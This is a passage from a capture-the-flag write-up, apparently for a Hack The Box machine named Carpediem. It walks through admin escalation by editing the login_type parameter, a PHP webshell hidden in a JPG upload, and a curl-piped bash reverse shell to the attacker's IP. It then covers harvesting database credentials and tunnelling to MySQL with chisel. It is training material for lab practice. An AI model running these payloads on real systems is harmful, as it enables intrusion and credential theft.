font-style: inherit;">➜</span>  carpediem sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> register.req <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> username <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dbs</span></span>
<span id="cb6-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">available</span> databases <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">1</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb6-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> portal</span></code></pre></div>
<p>Sadly it stops there, we’re unable to fetch tables and/or columns. I tried a lot of different common combinations such as table <code>users</code> and columns <code>username,password</code> but nothing. It looks like this might be a rabbit hole. Moving on to the next form, we can edit our user under <code>http://portal.carpediem.htb/?p=edit_account</code>.</p>
<p>Doing a edit, we can see a new interesting parameter in Burp - <code>login_type=2</code>. Changing this to <strong>1</strong> and we’re now able to access <code>/admin</code> <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem06.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem07.png" class="img-fluid"></p>
</section>
<section id="step-2---find-the-vuln" class="level3">
<h3 class="anchored" data-anchor-id="step-2---find-the-vuln">Step 2 - Find the vuln</h3>
<p>Going through the admin panel the options are slim, at first glance it looks like we have a lot of options but in reality they’ve removed all the <em>update/save</em> buttons only giving access to few functions.</p>
<p><strong>(1)</strong> We can create a new bike with text + image</p>
<p><strong>(2)</strong> Edit previously created bikes</p>
<p><strong>(3)</strong> Print a Booking Report PDF</p>
<p><strong>(4)</strong> Edit our user profile and add avatar image</p>
<p>Looking on bookings we find 5 entries, and from the data a new name: <code>jhammond@carpediem.htb</code>. Going to edit user profile I try to upload a malicious jpg containing php code, but this does nothing.</p>
<p>We can bypass this by simply capturing the request in burp and removing <code>.jpg</code> from the request body, and the file will be uploaded as a <code>.php</code>.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem exiftool <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-DocumentName</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;h1&gt;0xPThree - exploit.se</span></span>
<span id="cb7-2"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;?php if(isset(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\$</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">_REQUEST['cmd'])){echo '&lt;pre&gt;';</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\$</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd = (</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\$</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">_REQUEST['cmd']);system(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\$</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;"</span> exploit.jpg </span>
<span id="cb7-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> image files updated</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem mv exploit.jpg exploit.php.jpg</span></code></pre></div>
<p>From Burp intercept change filename:</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem08.png" class="img-fluid"></p>
<p>And our avatar should now be broken by the webshell.</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem09.png" class="img-fluid"></p>
<p>Right-click the image, open in new tab, and start to enumerate the box and/or setup a reverse shell.</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem10.png" class="img-fluid"></p>
<p>The uploaded php file is removed after a few minutes, so create a simple reverse shell:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4488 0&gt;&amp;1"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> rev.sh</span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem chmod +x rev.sh </span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb8-4"></span>
<span id="cb8-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Do a GET request to run 'rev.sh'</span></span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GET</span> /uploads/1662983460_exploit.php<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>cmd=curl%20http://10.10.14.10/rev.sh<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">bash</span></span>
<span id="cb8-7"></span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb8-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.167]</span> 46968</span>
<span id="cb8-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb8-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb8-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/var/www/html/portal/uploads$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb8-14"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb8-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3c371615b7aa</span></span></code></pre></div>
</section>
<section id="step-3---mysql" class="level3">
<h3 class="anchored" data-anchor-id="step-3---mysql">Step 3 - MySQL</h3>
<p>Enumerate the victim machine and we can start by looking for SQL credentials.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/var/www/html/portal/classes$</span> cat DBConnection.php</span>
<span id="cb9-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span></span>
<span id="cb9-3"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!defined</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_SERVER'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)){</span></span>
<span id="cb9-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">require_once</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"../initialize.php"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb9-5"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">class</span> DBConnection{</span>
<span id="cb9-7"></span>
<span id="cb9-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">private</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$host</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mysql'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb9-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">private</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$username</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'portaldb'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb9-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">private</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$password</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'J5tnqsXpyzkK4XNt'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb9-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">private</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$database</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'portal'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span></code></pre></div>
<p>Looking around further we can see we’re in a container. Upload <code>deepce.sh</code> to enumerate and it gives little to no info..</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/dev/shm$</span> bash deepce.sh</span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Inside Container ........ Yes</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Container Platform ...... docker</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Container tools ......... None</span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Docker Version .......... Version Unknown</span>
<span id="cb10-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Dangerous Capabilities .. Unknown <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">capsh</span> not installed<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Privileged Mode ......... Unknown</span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Useful tools installed .. Yes</span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/curl</span></span>
<span id="cb10-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/wget</span></span>
<span id="cb10-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/gcc</span></span>
<span id="cb10-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/hostname</span></span>
<span id="cb10-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/python3</span></span></code></pre></div>
<p>In <code>env</code> we find additional credentials:</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/$</span> ./usr/bin/env</span>
<span id="cb11-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_PORT_33060_TCP_ADDR</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>172.17.0.3</span>
<span id="cb11-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_PORT</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>tcp://172.17.0.3:3306</span>
<span id="cb11-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_PORT_3306_TCP_ADDR</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>172.17.0.3</span>
<span id="cb11-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_NAME</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>/portal/mysql</span>
<span id="cb11-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_ENV_MYSQL_ROOT_PASSWORD</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>3dQXeqjMHnq4kqDv</span>
<span id="cb11-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">MYSQL_PORT_3306_TCP_PORT</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>3306</span></code></pre></div>
<p>Upload <code>chisel</code> to the docker and setup a tunnel so we can use proxychains and reach <code>172.17.0.3:3306</code> Note that I wasn’t able to execute the binary in <code>/dev/shm</code> and had to move to <code>/tmp</code></p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Setup chisel server locally</span></span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem cat /etc/proxychains4.conf</span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">socks5</span>  127.0.0.1 5000</span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 4444 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--reverse</span></span>
<span id="cb12-6"></span>
<span id="cb12-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Connect with chisel client from victim</span></span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/dev/shm$</span> wget http://10.10.14.10/chisel_1.7.7_linux_amd64</span>
<span id="cb12-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/dev/shm$</span> chmod +x chisel_1.7.7_linux_amd64</span>
<span id="cb12-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@3c371615b7aa:/tmp$</span> ./chisel_1.7.7_linux_amd64 client 10.10.14.10:4444 R:5000:socks</span>
<span id="cb12-11"></span>
<span id="cb12-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Verify connection with nmap</span></span>
<span id="cb12-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sT</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span> 25 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 172.17.0.3</span>
<span id="cb12-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb12-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE SERVICE</span>
<span id="cb12-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3306/tcp</span> open  mysql</span></code></pre></div>
<p>Login to the MySQL database and try to extract valuable information:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span> 172.17.0.3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> portal <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> portaldb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: J5tnqsXpyzkK4XNt</span>
<span id="cb13-3"></span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">portal</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show tables<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb13-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+------------------+</span></span>
<span id="cb13-6"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Tables_in_portal</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+------------------+</span></span>
<span id="cb13-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bike_list</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">brand_list</span>       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">categories</span>       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">file_list</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rent_list</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system_info</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">users</span>            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+------------------+</span></span>
<span id="cb13-16"></span>
<span id="cb13-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">portal</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from users where username = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'admin'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb13-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span>
<span id="cb13-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">firstname</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lastname</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gender</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">contact</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">username</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">address</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">avatar</span>                            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">last_login</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">login_type</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">date_added</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">date_updated</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span>
<span id="cb13-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Jeremy</span>    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Hammond</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Male</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jhammond@carpediem.htb</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b723e511b084ab84b44235d82da572f3</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uploads/1635793020_HONDA_XADV.png</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NULL</span>       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2021-01-20</span> 14:02:37 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-04-01</span> 23:34:50 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb13-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span></code></pre></div>
<p>Unfortunately we’re not able to crack the hash using hashcat.</p>
<p>Lets test the other set of credentials found in <code>/usr/bin/env</code>, we don’t have a username so I’m guessing it’s default <code>root</code>:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span> 172.17.0.3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-P</span> 3306 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: 3dQXeqjMHnq4kqDv</span>
<span id="cb14-3"></span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> [<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
